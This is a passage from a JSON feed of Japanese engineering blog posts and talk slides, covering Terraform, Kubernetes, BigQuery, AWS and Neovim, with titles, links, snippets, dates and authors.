に参加して、LTしてきました。kichijojipm.connpass.com資料はこちら。言いたいこととしてはベストプラクティスなんてないよ。一般的によりよいプラクティスやパターンはあるけど、どんなときには適用できる銀の弾丸的なものはないから、自身の組織とサービスに合わせてくみ上げていきましょうということ。正解はひとつ!じゃない!!その上で、ざっくりとどんな選択肢と選択するための観点を述べていきました。まだ全然ブラッシュアップできるのでどこかでまとめてブログに書きたいところです。ちなみに最後に出てくる あなたらしく○○ は同僚のスライドのパロディです。毎回時間オーバーするのでトークで申し込んだ方が良いのでは?というツッコミはごもっともです。懇親会でもTerraformのお悩みとか短いですが話せて楽しかったです。また参加したいですね。","isoDate":"2023-12-03T07:17:54.000Z","dateMiliSeconds":1701587874000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Auroraアップグレード時のBlue/Green Deploymentsの利用","link":"https://zenn.dev/hakushou41/articles/70b83066cd1741","contentSnippet":"このエントリーは3-shake Advent Calendar 2023 4日目の記事です。株式会社スリーシェイクのメンバーが各々自由に技術・非技術ネタを投稿するカレンダーとなります。 はじめにAmazon Aurora2系について、標準サポート終了日(2024/10/31)まで1年を切りました。依然として、Aurora2系を利用しているシステムは多いのではないでしょうか。アプリケーションのテストや検証を考えると早めに動いていかなければならない時期となりました。本記事では、アップグレード方式・方針の一つとして、AWSからも推奨されているRDS Blue/Green Deplo...","isoDate":"2023-12-03T07:12:32.000Z","dateMiliSeconds":1701587552000,"authorName":"Shohei Takamura","authorId":"stakamura"},{"title":"Playwright Test generatorを利用したE2Eテスト ことはじめ","link":"https://zenn.dev/hakushou41/articles/65bc815b14354f","contentSnippet":"このエントリーは3-shake Advent Calendar 2023 3日目の記事です。株式会社スリーシェイクのメンバーが各々自由に技術・非技術ネタを投稿するカレンダーとなります。 はじめに現在、私はマイクロサービスを運用するSREを支援する人として活動しています。運用チームやSREが主導となって実施するメンテナンスやアップデート作業などでは、アップデート後の動作確認として、ブラウザを介したWebアプリケーションの簡易目視確認をします。これらの確認項目は、手順書へ項目を記載し、必要に応じてエビデンスをスクリーンショットで取得する必要があります。確認作業を網羅的にしようとす...","isoDate":"2023-12-02T15:00:00.000Z","dateMiliSeconds":1701529200000,"authorName":"Shohei Takamura","authorId":"stakamura"},{"title":"2023-12-01 吉祥寺.pm ベストプラクティスと組織とIaC","link":"https://speakerdeck.com/masasuzu/2022-12-01-ji-xiang-si-dot-pm","contentSnippet":"ベストプラクティスなんてものはない","isoDate":"2023-12-01T05:00:00.000Z","dateMiliSeconds":1701406800000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"データベースエンジニアのためのDB on Kubernetes入門ガイド","link":"https://zenn.dev/nnaka2992/articles/db_on_k8s_guide_for_db_engineers","contentSnippet":"このエントリーは3-shake Advent Calendar 2023 1日目の記事です。株式会社スリーシェイクのメンバーが各々自由に技術・非技術ネタを投稿するカレンダーとなります。 はじめに1959年にW. C. McGeeがデータベースという概念を提唱してから約65年、様々なアーキテクチャのデータベースが提案され様々なプラットフォームで利用されてきました。古くはメインフレームを中心に動作していたデータベースは、マイコンブームとともにそのアーキテクチャを変えながらにオープン系システムへと主戦場を移して行きました。オープン系が主流になってからもその進化は止まることなく、ベア...","isoDate":"2023-11-30T23:30:01.000Z","dateMiliSeconds":1701387001000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"gin.vimでgitの差分を快適に閲覧する","link":"https://blog.atusy.net/2023/11/29/gin-diff/","contentSnippet":"2023/11/29のVim駅伝記事です。vimを切っ掛けにエンジニアになった話」でした。gin.vimというVim上でGitを便利に扱うプラグインがあります。ExコマンドのGinを通じて、gitコマンドを実行するのが素朴な使い方です（例：Gin commit）。Ginの代わりにGinBufferを使うと、コマンドの実行結果をバッファに出力できます（例：GinBuffer log -n 1）。","isoDate":"2023-11-29T00:00:00.000Z","dateMiliSeconds":1701216000000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"KEP-4188: New kubelet gRPC API with endpoint returning local pods info","link":"https://zenn.dev/toversus/articles/791c7916e21059","contentSnippet":"!KEP 持ち寄り会 #1 の登壇資料です。2023/11/27 時点の KEP-4188 の内容です。Kubernetes 1.29 時点で機能として入っていないので注意して下さい。また、後半の文章は考察を含んでおり、正確な情報でない可能性があります。 概要KEP-4188 は、Kubelet に Pod Conditions を公開する gRPC API を追加する KEP です。Pod Conditions は Status フィールドに含まれています。❯ kubectl get pods -n kube-system coredns-5d78c9869d-8gglh ...","isoDate":"2023-11-27T08:23:13.000Z","dateMiliSeconds":1701073393000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"KEP-3063: Dynamic resource allocation","link":"https://speakerdeck.com/bells17/kep-3063-dynamic-resource-allocation","contentSnippet":"KEP持ち寄り会で発表した資料です。\\rKubernetesのKEP \\"Dynamic resource allocation\\" に関する情報をまとめた内容になります。\\r\\rイベントURL: https://kep.connpass.com/event/299651/\\r参考資料:\\r\\rhttps://zenn.dev/toversus/articles/fe2aa06f133b49 \\rhttps://kubernetes.io/blog/2022/12/15/dynamic-resource-allocation/ \\rhttps://github.com/kubernetes/enhancements/blob/master/keps/sig-node/3063-dynamic-resource-allocation/README.md \\rhttps://github.com/kubernetes-sigs/dra-example-driver/blob/main/demo/demo-apps.png \\rhttps://github.com/kubernetes/enhancements/blob/master/keps/sig-node/3063-dynamic-resource-allocation/components.png \\rhttps://github.com/cncf-tags/container-device-interface \\rhttps://github.com/containerd/containerd/blob/v1.7.9/pkg/cri/server/container_create_linux.go#L417-L419 \\rhttps://github.com/cncf-tags/container-device-interface/blob/main/pkg/cdi/container-edits.go#L70-L148 \\rhttps://github.com/kubernetes/enhancements/blob/master/keps/sig-node/3063-dynamic-resource-allocation/README.md \\rhttps://github.com/kubernetes/kubernetes/pull/111023 \\rhttps://github.com/orgs/kubernetes/projects/95/views/1 \\rhttps://github.com/kubernetes/dynamic-resource-allocation \\rhttps://www.cncf.io/projects/akri/ \\rhttps://github.com/kubernetes-sigs/dra-example-driver \\rhttps://github.com/NVIDIA/k8s-dra-driver \\rhttps://github.com/intel/intel-resource-drivers-for-kubernetes \\rhttps://github.com/intel/intel-device-plugins-for-kubernetes \\rhttps://docs.google.com/document/d/1BNWqgx_SmZDi-va_V31v3DnuVwYnF2EmN7D-O_fB6Oo/edit#heading=h.bxuci8gx6hna \\rhttps://drive.google.com/file/d/1iLg2FEAEilb1dcI27TnB19VYtbcvgKhS/view\\rhttps://developer.nvidia.com/blog/nvidia-gpu-operator-simplifying-gpu-management-in-kubernetes/ \\rhttps://docs.nvidia.com/datacenter/cloud-native/gpu-operator/latest/overview.html \\rhttps://docs.nvidia.com/datacenter/cloud-native/gpu-operator/latest/cdi.html \\rhttps://intel.github.io/intel-device-plugins-for-kubernetes/README.html \\rhttps://github.com/NVIDIA/k8s-device-plugin\\rhttps://blogs.nvidia.com/blog/multi-instance-gpus/ \\rhttps://developer.nvidia.com/blog/nvidia-ampere-architecture-in-depth/ \\rhttps://groups.google.com/a/kubernetes.io/g/dev/c/BDtCFfXQbw0?pli=1\\rhttps://kubernetes.slack.com/archives/C032ZE66A2X/p1700215190429689 \\rhttps://kubernetes.slack.com/archives/C032ZE66A2X/p1700215190429689","isoDate":"2023-11-27T05:00:00.000Z","dateMiliSeconds":1701061200000,"authorName":"bells17","authorId":"bells17"},{"title":"BigQueryの メタデータってどこから見れるの？","link":"https://zenn.dev/nedoko_dok0dko/articles/f6ccafeceac4a3","contentSnippet":"whatBigQueryのメタデータの取得先について簡単にまとめたもの BigQueryのメタデータ、調べることが出来るの?A. 出来るということで、メタデータの主な取得先について記載していく テーブル情報やレコード数BigQueryにはINFORMATION_SCHEMAという、メタデータなどを保持しているビューが存在している。これらを利用してメタデータを取得することが出来る。ただし、テーブルの更新日やテーブルのデータ量については記録されていない。https://cloud.google.com/bigquery/docs/information-sche...","isoDate":"2023-11-21T10:26:24.000Z","dateMiliSeconds":1700562384000,"authorName":"seno","authorId":"seno"},{"title":"走馬灯のIaCは考えておいて","link":"https://speakerdeck.com/nwiizo/zou-ma-deng-noiachakao-eteoite","contentSnippet":"走馬灯のIaCは考えておいてというタイトルで登壇してきました\\r\\r技術的負債に向き合う Online Conference\\rhttps://findy.connpass.com/event/297813/\\r\\r走馬灯のセトリは考えておいての短編はどれも面白いのでオススメです。\\rhttps://www.hayakawa-online.co.jp/shopdetail/000000015282/\\r\\r登壇ブログ |『走馬灯のIaCは考えておいて』というタイトルで登壇しました。\\rhttps://syu-m-5151.hatenablog.com/entry/2023/11/21/132144","isoDate":"2023-11-21T05:00:00.000Z","dateMiliSeconds":1700542800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"プラグインをURLで指定しやすくするために、tree-sitterでURIパーサーを作ってNeovimを彩ってみた","link":"https://blog.atusy.net/2023/11/17/tree-sitter-uri/","contentSnippet":"この記事はVim駅伝2023年11月17日(金)の記事です。VimやNeovimでプラグインマネージャーに使いたいプラグインを指定するとき、GitHubでの配布物であればユーザー名/レポジトリ名での指定が一般的です。","isoDate":"2023-11-17T00:00:00.000Z","dateMiliSeconds":1700179200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"ツールごとのOPA/Regoの書き方","link":"https://zenn.dev/tayusa/articles/63f286f4733a87","contentSnippet":"RegoとはKubernetesやTerraformの静的解析で既存のルールでは足りないときや自分でカスタマイズしたいときにRegoというポリシー言語でコードを書くhttps://www.openpolicyagent.org/docs/latest/policy-language/ Regoを利用できるツールの例conftesthttps://www.conftest.dev/自分で全部書くtrivyhttps://aquasecurity.github.io/trivy/latest/docs/scanner/misconfiguration/cust...","isoDate":"2023-11-16T03:05:53.000Z","dateMiliSeconds":1700103953000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"MinIO Client で Amazon S3 や Cloudflare R2 を利用する","link":"https://blog.1q77.com/2023/11/minio-client/","contentSnippet":"Cloudflare R2 は egress の費用がかからないということで手元のファイルのバックアップに使ってみようかなと思ったときにクライアントとして何を使おうかな aws cli 使うほどじゃないしなということで MinIO Client (mc) を使ってみたメモ。","isoDate":"2023-11-12T11:13:31.000Z","dateMiliSeconds":1699787611000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"kube-proxy入門","link":"https://speakerdeck.com/bells17/kube-proxyru-men","contentSnippet":"Kubernetes Novice Tokyo #28 の登壇資料です\\r\\rイベントURL: https://k8s-novice-jp.connpass.com/event/293157/\\r配信URL: https://www.youtube.com/watch?v=LSW51Cm0Wc0\\r\\rコードリーディングメモ:\\rhttps://zenn.dev/bells17/scraps/5e41da598a8266\\r\\r参考資料:\\rhttps://github.com/kubernetes/kubernetes/tree/v1.28.2 \\rhttps://speakerdeck.com/ryusa/servicewotazunete3000xing-kuberneteskodorideingufalselu \\rhttps://qiita.com/Tocyuki/items/6d90a1ec4dd8e991a1ce \\rhttps://oxynotes.com/?p=6361#5 \\rhttps://atmarkit.itmedia.co.jp/ait/articles/1002/09/news119.html \\rhttps://hana-shin.hatenablog.com/entry/2022/06/21/215757 \\rhttps://qiita.com/syui/items/27020b970775a0c508ba \\rhttps://www.digitalocean.com/community/tutorials/iptables-essentials-common-firewall-rules-and-commands \\rhttps://www.asahi-net.or.jp/~aa4t-nngk/ipttut/output/explicitmatches.html \\rhttps://github.com/torvalds/linux/blob/master/Documentation/networking/nf_conntrack-sysctl.rst \\rhttps://tech-blog.rakus.co.jp/entry/20220301/iptables \\rhttps://linuxjm.osdn.jp/html/iptables/man8/iptables-extensions.8.html \\rhttps://man.archlinux.org/man/conntrack.8.en \\rhttps://nomeu.net/8380/ \\rhttps://knowledge.sakura.ad.jp/4048/ \\rhttps://docs.openshift.com/container-platform/4.10/rest_api/network_apis/service-v1.html \\rhttps://stackoverflow.com/questions/75835169/kubernetes-loadbalancer-how-does-healthchecknodeport-work \\rhttps://kubernetes.io/docs/tasks/access-application-cluster/create-external-load-balancer/#preserving-the-client-source-ip \\rhttps://kubernetes.io/docs/concepts/services-networking/service-traffic-policy/ \\rhttps://kubernetes.io/docs/tasks/access-application-cluster/create-external-load-balancer/ \\rhttps://hyoublog.com/2020/05/20/kubernetes-externalip-service/ \\rhttps://qiita.com/dingtianhongjie/items/8f3c320c4eb5cf25d9de \\rhttps://milestone-of-se.nesuke.com/nw-basic/as-nw-engineer/loopback-address-interface/ \\rhttps://kubernetes.io/docs/reference/networking/virtual-ips/ \\rhttps://kubernetes.io/docs/concepts/services-networking/service/ \\rhttps://kubernetes.io/ja/docs/concepts/services-networking/connect-applications-service/ \\rhttps://knowledge.sakura.ad.jp/22636/ \\rhttps://netfilter.org/index.html \\rhttps://madomadox.hatenablog.com/entry/2021/01/03/190730 \\rhttps://qiita.com/bashaway/items/e405d59d92670fbc5341 \\rhttps://www.digitalocean.com/community/tutorials/a-deep-dive-into-iptables-and-netfilter-architecture \\rhttps://tech-blog.rakus.co.jp/entry/20220301/iptables \\rhttps://www.asahi-net.or.jp/~aa4t-nngk/ipttut/output/explicitmatches.html \\rhttps://eng-entrance.com/linux-firewall \\r\\r\\r画像引用元:\\rhttps://github.com/kubernetes/community/tree/master/icons \\rhttps://github.com/kubernetes/kubernetes/tree/master/logo \\rhttps://github.com/cncf/artwork/tree/master/projects/kubernetes \\rhttps://github.com/kubernetes/kubeadm/tree/main/logos","isoDate":"2023-11-09T05:00:00.000Z","dateMiliSeconds":1699506000000,"authorName":"bells17","authorId":"bells17"},{"title":"Amazon ECSイベントをCloudWatch Logsへ収集する","link":"https://zenn.dev/yuu0w0yuu/articles/df3a9fdef609e2","contentSnippet":"この記事は、3-shake Advent Calendar 2023 1日目のエントリ記事です。 きっかけECSは、Container Insightsを有効化することでクラスタやサービスといった各レイヤのパフォーマンスメトリクスをCloudWatchに収集できる。一方で、以下のようなケースにおいて一定の仮説を導くためには、このメトリクスだけではやや不足感があるため、発生したイベントやその結果を別の方式で監視したくなった。メトリクスがスパイクしたタイミングで何が起きていたか？デプロイを実行したが結果はどうだったか？デプロイが失敗したが原因は何か？などなど・・調べてみ...","isoDate":"2023-11-02T08:33:22.000Z","dateMiliSeconds":1698914002000,"authorName":"Yutaro Shirayama","authorId":"yuu0w0yuu"},{"title":"テキストの折り畳みを彩る vim.treesitter.foldtext() を使ってみる","link":"https://blog.atusy.net/2023/10/26/treesitter-foldtext/","contentSnippet":"Neovim 0.10で使えるようになるvim.treesitter.foldtext()を使うと折り畳んだコードもキレイに色付けられるぞ。ラッパー書けば次の行の情報も色付けて表示できたりしてとっても便利だぞ。","isoDate":"2023-10-26T00:00:00.000Z","dateMiliSeconds":1698278400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"【Terraform\uD83E\uDDD1\uD83C\uDFFB‍\uD83D\uDE80】\\"Findy Terraform 活用大全 - IaCの今\\" に登壇","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/10/25/550144","contentSnippet":"発表スライドから得られる知識発表スライドを見ると、以下を \\"完全に理解\\" できます✌️Terraformのtfstateの分割パターンtfstate分割をリポジトリやリモートバックエンドのディレクトリ構成への適用する方法発表スライドから得られる知識イベント名発表スライドイベント名オッス！オラ長谷川！✋\uD83C\uDFFB『 tfstate の分割パターンとディレクトリ構成への適用』ていうテーマで、 Findy Terraform 活用大全 - IaCの今 に登壇したぞ！発表スライドみんな！スライドぜってぇ見てくれよな！『Terraform活用大全 - IaCの今。』の登壇資料です!!tfstateを分割してみんなで最高になろう✌\uD83C\uDFFB#Terraform_findyhttps://t.co/NteGvKdMEE— 長谷川 広樹 (地下強制労働者) (@Hiroki__IT) October 25, 2023 ちな、発表内容の詳細はこの記事をみてくれよな！","isoDate":"2023-10-25T03:00:00.000Z","dateMiliSeconds":1698202800000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"\uD83E\uDDD1‍\uD83D\uDE80 tfstate の分割パターンとディレクトリ構成への適用","link":"https://speakerdeck.com/hiroki_hasegawa/tfstate-nofen-ge-hatantoteirekutorigou-cheng-henoshi-yong","contentSnippet":"『Terraform活用大全 - IaCの今』の登壇資料です\\r\\r\\r・Terraformのtfstateの分割パターン\\r・tfstate分割をリポジトリやリモートバックエンドのディレクトリ構成への適用する方法\\r\\rを紹介しました\\r\\rスライドでは少ししか分割パターンを紹介できませんでしたので、ぜひ元記事 (tfstateファイルの分割パターンとディレクトリ構成への適用) もご参照ください\uD83D\uDC4D\uD83C\uDFFB\\r\\r\uD83D\uDC26 ツイート：https://x.com/Hiroki__IT/status/1717030862452384047","isoDate":"2023-10-24T04:00:00.000Z","dateMiliSeconds":1698120000000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"YugabyteDBのドキュメントを全部読む Day9","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/9_core_functions_high_availability","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Read I/O pathを読みました。今回はArchitecture > Core functions > High Availabilityを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。High availabilityYugabyteDBは一貫性と分断耐性を兼ね備えたデータベースであると同時にリーダーの障害時に新しいリーダーとしてフェイルオーバー出来るアクティブレプリカを持つことで高可用性(HA)を達成している。もしノードに障害が発生した場合、そのノード上で動作するYB-TServerとYB-Masterの停止を引き起こす。YB-TServer failureYB-TServerはYSQLレイヤとアクティブなIOを提供するピアーリーダータブレットを含むタブレットをホストする。YSQレイヤとタブレットピアーフォロワーとタブレットピアーリーダーで発生した障害はそれぞれ特別な方法であつかわれる。YQL failureアプリケーションの視点からみればYQLはステートレスである。そのためクライアントが発行したリクエストは単純に他ノードのYQLにリクエストが送信される。スマートクライアントを利用している場合、スマートクライアントは理想的なYB-TServerの場所をタブレットが所有するキーから検索し、リクエストを直接そのノードに転送する。Tablet peer follower failureタブレットピアーフォロワーはクリティカルパスではない。この障害はユーザーリクエストへの可用性に影響しない。Tablet peer leader failureタブレットピアーリーダーの障害は数秒以内にRaftレベルのリーダー選出を自動的にトリガーし、他のYB-TServerに配置されているタブレットピアーが新しいリーダーとして選出される。タブレットピアリーダーに障害が発生した場合、可用性が損なわている時間は約3秒(ハードビートの感覚がデフォルトの500msの場合)である。YB-Master failureYB-Masterは通常のIOオペレーションではクリティカルパスでは無いため、ユニバースを動作させるのに影響は無い。しかしYB-Masterは異るノードで動作するピアーのRaftグループの一部であるため。このピアーのうちの一つがアクティブなマスターで残りがアクティブスタンバイである。YB-Masterのリーダーであるアクティブマスターに障害が発生した場合、ピアーはリーダーの障害を検知し、新なアクティブマスターであるYB-Masterのリーダーを障害時に数秒以内で再選出する。","isoDate":"2023-10-21T15:12:37.000Z","dateMiliSeconds":1697901157000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Google Application Integrationについて","link":"https://zenn.dev/nedoko_dok0dko/articles/365af68bb280e7","contentSnippet":"whatGoogle Cloudの「Application Integration」というサービスについて軽く調べたことをまとめたログ関連してiPaasについても調べたことを記載する Application Integrationとはhttps://cloud.google.com/application-integration?hl=jaGoogle Cloudが提供するIntegration Platform as a Service（iPaaS）ソリューションビジュアルエディタを利用することによって、以下がノーコードで行えるイベントによるトリガーの...","isoDate":"2023-10-18T09:20:05.000Z","dateMiliSeconds":1697620805000,"authorName":"seno","authorId":"seno"},{"title":"TailscaleのMagicDNSがなぜかLinux上で動かなくなったのでトラブルシューティングした","link":"https://blog.atusy.net/2023/10/17/tailscale-magicdns-with-networkmanager/","contentSnippet":"MagicDNSを使っているつもりだが、名前解決に失敗する……！どうやらLinuxの場合、NetworkManager + systemd-resolvedという構成を使っているケースが多いらしく、以下のようにして、 /etc/resolv.confを設定してやればいいようだ（Configuring Linux DNS）。","isoDate":"2023-10-17T00:00:00.000Z","dateMiliSeconds":1697500800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"コンテナ \xd7 セキュリティ \xd7 AWS","link":"https://speakerdeck.com/kyohmizu/kontena-x-sekiyuritei-x-aws","contentSnippet":"「JAWS-UG コンテナ支部 \xd7 JAWS-UG 千葉支部 #1 今知りたいコンテナセキュリティ」の資料です。\\rhttps://jawsug-container.connpass.com/event/295110/","isoDate":"2023-10-16T04:00:00.000Z","dateMiliSeconds":1697428800000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Cloud Asset Inventoryとは","link":"https://zenn.dev/nedoko_dok0dko/articles/e80d73d4f28a79","contentSnippet":"whatGoogle Cloud のCloud Asset Inventoryについて調べてわかったことの個人まとめ Cloud Asset Inventoryとはhttps://cloud.google.com/asset-inventory/docs/overview?hl=jaCloud Asset Inventory は、時系列データベースに基づいてインベントリ サービスを提供します。このデータベースは、Google Cloud のアセット メタデータの 35 日間分の履歴を保持します。過去 35 日間変更がない既存のアセットの場合、Cloud Asset ...","isoDate":"2023-10-13T10:27:12.000Z","dateMiliSeconds":1697192832000,"authorName":"seno","authorId":"seno"},{"title":"kube-controller-manager入門","link":"https://speakerdeck.com/bells17/kube-controller-managerru-men","contentSnippet":"SRETT #7 で発表した資料です。\\rhttps://3-shake.connpass.com/event/293432/\\r\\r発表のライブ配信はこちら。\\rhttps://www.youtube.com/watch?v=h1VxlvF9bls\\r\\rzennのスクラップ:\\rhttps://zenn.dev/bells17/scraps/592a02b3bc1ff3\\r\\rスライドで紹介した参考リンク集:\\r- https://github.com/kubernetes/kubernetes/tree/v1.28.2","isoDate":"2023-10-12T04:00:00.000Z","dateMiliSeconds":1697083200000,"authorName":"bells17","authorId":"bells17"},{"title":"Rでアホになった要素を速く見つけろ！（ナベアツネタ）","link":"https://blog.atusy.net/2023/10/12/fast-fool-findier/","contentSnippet":"ナベアツは数字がでかくなるほどアホになる割合がアップすると聞いたので検証してみましたhttps://twitter.com/jagarikin/status/1711855799184785732これをRでやってみるべく、MITTIさんが書いたコードが重いらしいです。","isoDate":"2023-10-12T00:00:00.000Z","dateMiliSeconds":1697068800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"SREとPlatform Engineerの交差点","link":"https://speakerdeck.com/nwiizo/sretoplatform-engineernojiao-chai-dian","contentSnippet":"Platform Engineering Meetup #5 #PFEM\\rhttps://platformengineering.connpass.com/event/295048/ \\r\\rSREとPlatform Engineerの交差点: 2つの領域の交差と組織への適用 というタイトルで登壇します。\\r\\r登壇ブログ |『SREとPlatform Engineerの交差点:2つの領域の交差と組織への適用』というタイトルで登壇しました\\rhttps://syu-m-5151.hatenablog.com/entry/2023/10/05/233555\\r\\rグレイラットの殺人 ワシントン・ポーが面白かったのでオススメです。\\rhttps://www.hayakawa-online.co.jp/shopdetail/000000015569/","isoDate":"2023-10-05T04:00:00.000Z","dateMiliSeconds":1696478400000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"DietPi で DNLA サーバー","link":"https://blog.1q77.com/2023/09/minidlna-on-dietpi/","contentSnippet":"Raspberry Pi 4 を買った週に Raspberry Pi 5 が発表されてちょっと悔しいところですが Windows XP 時代から OS を更新しながら使っていた古いデスクトップPCを処分したのでそこで使っていた HDD をラズパイにつないで Samba で NAS としてアクセス可能にしてみました。そこには昔ハンディカムで撮影した動画なんかも沢山保存されていたのでテレビでそれを見れるように DLNA のメディアサーバーすることにしました。","isoDate":"2023-09-30T08:33:09.000Z","dateMiliSeconds":1696062789000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"EventBridge Scheduler からの Lambda 関数起動に Lambda Permission は不要","link":"https://zenn.dev/toshikish/articles/743f69389aa99c","contentSnippet":"AWS Lambda 関数の他サービスからの呼び出しAWS Lambda 関数にはリソースベースポリシーを割り当てることができます。関数を他のサービスから呼び出すとき，通常はリソースベースポリシーにそのサービスからの実行を許可するポリシーを追加する必要があります。例えば，Amazon SNS からイベント駆動で呼び出す場合は，以下のように add-permission コマンドを実行することでポリシーを追加することができます。aws lambda add-permission --function-name example-function \\\\--action lambda...","isoDate":"2023-09-22T10:16:34.000Z","dateMiliSeconds":1695377794000,"authorName":"toshikish","authorId":"toshikish"},{"title":"WSL 2 で外部ストレージをマウント","link":"https://blog.1q77.com/2023/09/wsl2-mount-volume/","contentSnippet":"Laptop を Linux で使用していた時の遺産を WSL 環境でも使おうと XFS でフォーマットされた USB 接続の HDD をマウントする方法がないかなと思って調べたメモ。Microsoft のドキュメントにありました。","isoDate":"2023-09-21T14:08:28.000Z","dateMiliSeconds":1695305308000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"IPA試験 合格体験記/qualification-story","link":"https://speakerdeck.com/moz_sec_/qualification-story","contentSnippet":"","isoDate":"2023-09-15T04:00:00.000Z","dateMiliSeconds":1694750400000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"BigQueryの行列レベルのアクセス制御について","link":"https://zenn.dev/nedoko_dok0dko/articles/bc6a413eb623c7","contentSnippet":"whatBigQueryにおける「行列レベル」のアクセス制御について調べたことをまとめる そもそも: 行・列単位に対してのアクセス制御は可能なのか?A. できるそれぞれ記載していく 列単位https://cloud.google.com/bigquery/docs/column-level-security-intro?hl=ja列に対して事前定義したポリシータグと呼ばれるものを付与することで、特定のアカウントやグループだけが列にアクセスできる。アクセスポリシーはSQLを実行する際に確認され、許可されていないメンバーからのクエリはAccess Denitedと...","isoDate":"2023-09-14T11:46:25.000Z","dateMiliSeconds":1694691985000,"authorName":"seno","authorId":"seno"},{"title":"Cloud Deployを使ったCloud Runのリリース","link":"https://zenn.dev/satohjohn/articles/7e6a70edc8f36e","contentSnippet":"概要Cloud RunのリリースにCloud Deployを使ってみます。 そもそもCloud Deployとはhttps://cloud.google.com/deploy?hl=jaGKE、Cloud Runのリリースを管理できるサービスになります。リリースフローを記載したパイプラインの定義を作成し、パイプラインを作成したら、フローを管理できるようになります。各フローでは基本内部でskaffoldを通して、Cloud Buildが実行される形です。Cloud Deployを使うと以下のような、リリースフローになるかと思います。Cloud BuildでImageを...","isoDate":"2023-09-13T05:47:13.000Z","dateMiliSeconds":1694584033000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Kubernetesソースコードリーディング入門","link":"https://speakerdeck.com/bells17/kubernetessosukotoriteinkuru-men","contentSnippet":"Kubernetes Novice Tokyo #27 で発表した資料です。\\rhttps://k8s-novice-jp.connpass.com/event/293144/\\r\\r発表のライブ配信はこちら。\\rTODO\\r\\rスライドで紹介した参考リンク集:\\rhttps://bells17.medium.com/things-you-should-know-about-reading-kubernetes-codes-933b0ee6181d \\rhttps://www.amazon.co.jp/dp/4297104385/\\rhttps://www.amazon.co.jp/dp/4297118378/ \\rhttps://go.dev/tour/welcome/1 \\rhttps://gopherdojo.org/studyroom/ \\rhttps://www.amazon.co.jp/dp/4621300253/ \\rhttps://speakerdeck.com/bells17/kubelet-and-containers \\rhttps://speakerdeck.com/ryusa/servicewotazunete3000xing-kuberneteskodorideingufalselu \\rhttps://speakerdeck.com/bells17/kube-api-server-k8sjp \\rhttps://speakerdeck.com/sanposhiho/zi-zuo-sitexue-bukubernetes-schedulerru-men \\rhttps://speakerdeck.com/bells17/cloud-controller-manager-deep-dive \\rhttps://speakerdeck.com/masayaaoyama/infrastudy2-k8s \\rhttps://github.com/kubernetes/client-go/tree/master/examples/workqueue \\rhttps://github.com/kubernetes/sample-controller/blob/master/controller.go \\rhttps://github.com/kubernetes-sigs/kubebuilder \\rhttps://speakerdeck.com/bells17/kubebuilder-introduction \\rhttps://zoetrope.github.io/kubebuilder-training/ \\rhttps://github.com/cybozu-go \\rhttps://www.youtube.com/watch?v=yqB_le-N6EE \\rhttps://github.com/kubernetes/enhancements/blob/master/keps/sig-instrumentation/1602-structured-logging/README.md \\rhttps://github.com/kubernetes/enhancements/issues/1602 \\rhttps://github.com/kubernetes/klog/issues/125 \\rhttps://github.com/kubernetes/klog/pull/126 \\rhttps://github.com/kubernetes-csi \\rhttps://kubernetes-csi.github.io/docs/drivers.html \\rhttps://speakerdeck.com/bells17/introduction-to-csi \\rhttps://github.com/kubernetes/kubeadm \\rhttps://speakerdeck.com/bells17/implementation-of-kubeadm-init \\rhttps://github.com/kubernetes-sigs/metrics-server \\rhttps://speakerdeck.com/bells17/metrics-server \\rhttps://speakerdeck.com/bells17/accurate-introduction \\rhttps://github.com/cybozu-go/accurate \\rhttps://slack.k8s.io/ \\rhttps://www.youtube.com/watch?v=Ayo5w-CSmP0 \\rhttps://github.com/kubernetes/community","isoDate":"2023-09-12T04:00:00.000Z","dateMiliSeconds":1694491200000,"authorName":"bells17","authorId":"bells17"},{"title":"GitHub ActionsでWorkload Identityでの認証を入れてGoogle CloudのAPIを叩く","link":"https://zenn.dev/satohjohn/articles/1645be8e83eab6","contentSnippet":"概要正直難しいと思ってたのですが、資料を読んでいくと表面上、実装は難しくありませんでした。GitHub ActionsとGoogle Cloudを連携する場合、json管理とかしなくても済むし、基本的にやっておいて損はないと思います。ユースケースとしては、例えば、GitHub Actionsで実行した結果(report)をGoogle Cloud Storageにデータを送りたいなどの際に使えると思います。Identity Poolに対して、providerは複数作成できるため、いろんな GitHub Actionsから利用されるようなパターンでも、provider:scri...","isoDate":"2023-09-11T14:17:35.000Z","dateMiliSeconds":1694441855000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"BigQueryのオンデマンド料金におけるコスト管理方法についてメモ","link":"https://zenn.dev/nedoko_dok0dko/articles/f0da04c4a70ea6","contentSnippet":"whatBigQueryにおけるコスト管理方法について、公式ドキュメントを元にメモしたログ今回はオンデマンド料金について記載のため、定額料金(BigQuery Editions)に関しては記載しない 高額請求が来てしまうパターンとはよく見かける/耳にするのは以下のような場合(あくまで一例)大量にデータをスキャンするクエリを実行するselect * 系のクエリを投げる(Table Patitionを利用したテーブルの場合)partitionで指定しないでクエリを投げる料金がかかるクエリをバッチなど利用して連続で実行してしまうTable 